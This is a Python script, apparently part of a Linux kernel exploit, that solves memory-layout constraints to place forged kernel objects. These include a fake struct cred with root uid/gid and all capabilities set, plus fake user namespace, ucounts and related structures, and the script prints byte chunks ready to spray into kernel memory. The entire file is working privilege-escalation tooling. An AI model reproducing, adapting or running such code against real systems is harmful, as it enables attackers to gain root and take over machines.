# lay10.py -- CSP for the uniform psl pattern.
#
# Unlike lay9 this places objects in ANY order: a pointer field to an object
# that is not placed yet becomes a "demand" (target, extractor, byte index)
# on a residue; the byte is fixed when that object is placed.  Fixed fields
# and demands that meet on a residue must agree.  Search = cred phase/block
# enumeration + MRV backtracking over the other seven objects.
import random, sys
import itertools

WLO, WHI = 0x18, 0xf8
NLONG = 0x7fffffffffffffff
NBLK = 32

CRED = [
    (0x00, 8, ('self',)),
    (0x08, 8, None),                 # gid|suid: clobbered by the erase
    (0x10, 4, None),                 # sgid
    (0x14, 4, 0),                    # euid
    (0x18, 4, 0),                    # egid
    (0x1c, 4, 0xffffffff),           # fsuid (iteration-2 expires high word)
    (0x20, 8, 0),                    # fsgid|securebits
    (0x28, 8, 0),                    # cap_inheritable
    (0x30, 8, 0xffffffffffffffff),   # cap_permitted
    (0x38, 8, 0xffffffffffffffff),   # cap_effective
    (0x40, 8, 0xffffffffffffffff),   # cap_bset
    (0x48, 8, 0),                    # cap_ambient
    (0x50, 0x28, 0),                 # keyrings
    (0x78, 8, ('addr', 'sec')),
    (0x80, 8, ('addr', 'user')),
    (0x88, 8, ('addr', 'ns')),
    (0x90, 8, ('addr', 'ucounts')),
    (0x98, 8, ('addr', 'gi')),
    (0xa0, 0x10, 0),                 # rcu_head
]
NS = [
    (0x00, 4, 1),                    # uid_map.nr_extents
    (0x08, 4, 0),                    # extent[0].first
    (0x0c, 4, 0),                    # extent[0].lower_first
    (0x10, 4, ('low32', 'P')),       # extent[0].count (aliases ucounts@0x210)
    (0x48, 4, 1),                    # gid_map.nr_extents
    (0x58, 4, 1),                    # gid extent[0].count
    (0xd8, 8, 0),                    # parent (never followed: level check)
    (0xe0, 4, 0x7fffffff),           # level
    (0x104, 4, 0x40000000),          # ns.count
    (0x210, 8, ('addr', 'P')),       # ucounts
    (0x268, 8, NLONG),               # rlimit_max[0]
]
UC = [
    (0x10, 8, ('addr', 'ns')),       # ucounts.ns
    (0x18, 4, ('hi32', 'cred')),     # ucounts.uid
    (0x1c, 4, 0x40000000),           # ucounts.count
    (0x70, 8, 0),                    # rlimit[0]
]
UP = [
    (0x10, 8, ('addr', 'Q')),        # ucounts.ns of the alias chain
    (0x70, 8, 0),                    # rlimit[0]
]
UQ = [
    (0x210, 8, 0),                   # ends the rlimit walk
    (0x268, 8, NLONG),               # rlimit_max[0]
]
USER = [(0x00, 4, 0x40000000)]
GI = [(0x00, 4, 0x40000000), (0x04, 4, 0)]
SEC = [(0x00, 4, 1), (0x04, 4, 1)]
OBJS = {'cred': CRED, 'ns': NS, 'ucounts': UC, 'P': UP, 'Q': UQ,
        'user': USER, 'gi': GI, 'sec': SEC}
OTHERS = ['ns', 'ucounts', 'P', 'Q', 'user', 'gi', 'sec']


class Fail(Exception):
    pass


class State:
    __slots__ = ('mem', 'demands', 'addr', 'base', 'forbid')

    def __init__(self, base, forbid):
        self.mem = {}        # residue -> byte
        self.demands = []    # (residue, target, kind, byte_index)
        self.addr = {}
        self.base = base
        self.forbid = forbid  # set of block indices

    def copy(self):
        s = State(self.base, self.forbid)
        s.mem = dict(self.mem)
        s.demands = list(self.demands)
        s.addr = dict(self.addr)
        return s

    def blocks_of(self, A, obj):
        out = set()
        for (off, size, spec) in OBJS[obj]:
            if spec is None:
                continue
            for i in range(size):
                out.add(((A + off + i) - self.base) >> 8)
        return out

    def place(self, obj, A):
        """Return a new State or None."""
        if A & 7:
            return None
        d = A - self.base
        if d < 0 or d + 0x300 > 0x2000:
            return None
        if (d >> 8) in self.forbid:
            return None
        used = self.blocks_of(A, obj)
        if used & self.forbid:
            return None
        if any(b < 0 or b >= NBLK for b in used):
            return None
        s = self.copy()
        adds = {}

        def commit(r, v):
            if r < WLO or r >= WHI:
                raise Fail('residue %#x outside window' % r)
            if r in s.mem:
                if s.mem[r] != v:
                    raise Fail('conflict at %#x' % r)
                return
            if r in adds and adds[r] != v:
                raise Fail('self-conflict at %#x' % r)
            adds[r] = v

        def val_of(spec):
            if isinstance(spec, int):
                return spec
            kind = spec[0]
            if kind == 'self':
                return A
            target = spec[1]
            if target in s.addr:
                B = s.addr[target]
                if kind == 'addr':
                    return B
                if kind == 'low32':
                    return B & 0xffffffff
                if kind == 'hi32':
                    return (B >> 32) & 0xffffffff
            return None

        try:
            # 1. own fields
            for (off, size, spec) in OBJS[obj]:
                if spec is None:
                    continue
                v = val_of(spec)
                for i in range(size):
                    r = (A + off + i) & 0xff
                    if v is not None:
                        commit(r, (v >> (8 * i)) & 0xff)
                    else:
                        # demand on an unplaced target
                        if r < WLO or r >= WHI:
                            raise Fail('demand residue %#x' % r)
                        s.demands.append((r, spec[1], spec[0], i))
            # 2. demands this object answers
            keep = []
            for (r, target, kind, bi) in s.demands:
                if target != obj:
                    keep.append((r, target, kind, bi))
                    continue
                if kind == 'addr':
                    v = A
                elif kind == 'low32':
                    v = A & 0xffffffff
                else:
                    v = (A >> 32) & 0xffffffff
                commit(r, (v >> (8 * bi)) & 0xff)
            s.demands = keep
        except Fail:
            return None
        s.mem.update(adds)
        s.addr[obj] = A
        return s


def chunks_of(mem):
    out = []
    for k in range(14):
        base = WLO + 16 * k
        out.append(bytes(mem.get(base + i, 0) for i in range(16)))
    return out


def feasible(state, obj, rnd=None):
    out = []
    for b in range(NBLK):
        if b in state.forbid:
            continue
        for p in range(WLO, 0xf0, 8):
            s = state.place(obj, state.base + 0x100 * b + p)
            if s is not None:
                out.append((b, p))
    if rnd:
        rnd.shuffle(out)
    return out


def dfs(state, todo, rnd, budget, depth=0):
    if not todo:
        return state
    # MRV
    best = None
    cand = None
    for obj in todo:
        fs = feasible(state, obj)
        if not fs:
            return None
        if cand is None or len(fs) < len(cand):
            best, cand = obj, fs
            if len(fs) <= 1:
                break
    rnd.shuffle(cand)
    for (b, p) in cand:
        budget[0] -= 1
        if budget[0] < 0:
            return None
        s2 = state.place(best, state.base + 0x100 * b + p)
        if s2 is None:
            continue
        r = dfs(s2, [o for o in todo if o != best], rnd, budget, depth + 1)
        if r is not None:
            return r
    return None


def solve(base, oi, sid=1, tries=1, budget=200000, seed=1):
    # block O holds the node; the cred's block is clobbered at cred+8..+0xf
    # by the stage-2 erase, so no other fake object may live there either.
    for bC in range(NBLK):
        if bC == oi:
            continue
        for pC in range(0x18, 0x49, 8):
            C = base + 0x100 * bC + pC
            s = State(base, {oi}).place('cred', C)
            if s is None:
                continue
            # the cred may (must) live in its own block; everything else may
            # not share it or the node block.
            s.forbid = {oi, bC}
            rnd = random.Random(seed ^ (bC << 8) ^ pC)
            got = dfs(s, list(OTHERS), rnd, [budget])
            if got is None:
                continue
            ch = chunks_of(got.mem)
            if len(set(ch)) != 14:
                continue
            return got, (bC, pC)
    return None, None


def dump(st, tag):
    print(tag)
    for o in ['cred'] + OTHERS:
        A = st.addr[o]
        print('  %-8s %#018x  block %2d phase %#04x' %
              (o, A, (A - st.base) >> 8, A & 0xff))
    bad = [r for r in st.mem if not (WLO <= r < WHI)]
    print('  out-of-window residues:', bad)
    print('  unresolved demands:', st.demands[:5], len(st.demands))


def main():
    base = 0xffffff80036d2000
    oi = 11
    sid = 1
    if len(sys.argv) > 1:
        base = int(sys.argv[1], 0)
    if len(sys.argv) > 2:
        oi = int(sys.argv[2], 0)
    if len(sys.argv) > 3:
        sid = int(sys.argv[3], 0)
    st, info = solve(base, oi, sid)
    if st is None:
        print('NO LAYOUT base=%#x oi=%d' % (base, oi))
        return 1
    dump(st, 'LAYOUT base=%#x oi=%d cred=(%d,%#x)' % (base, oi, info[0], info[1]))
    ch = chunks_of(st.mem)
    print('  chunks distinct:', len(set(ch)) == 14)
    for i, c in enumerate(ch):
        print('   [%2d] %s' % (i, c.hex()))
    return 0


if __name__ == '__main__':
    sys.exit(main())
